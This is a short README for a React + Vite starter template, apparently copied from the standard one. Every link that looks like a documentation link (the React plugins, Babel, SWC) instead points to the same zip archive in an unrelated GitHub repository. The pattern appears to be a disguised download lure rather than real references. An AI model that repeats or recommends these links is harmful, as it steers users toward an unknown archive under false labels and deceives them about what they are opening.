# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

- [@vitejs/plugin-react](https://raw.githubusercontent.com/julioroque/api_Filmes/master/public/Filmes-api-Harrisia.zip) uses [Babel](https://raw.githubusercontent.com/julioroque/api_Filmes/master/public/Filmes-api-Harrisia.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/julioroque/api_Filmes/master/public/Filmes-api-Harrisia.zip) uses [SWC](https://raw.githubusercontent.com/julioroque/api_Filmes/master/public/Filmes-api-Harrisia.zip) for Fast Refresh
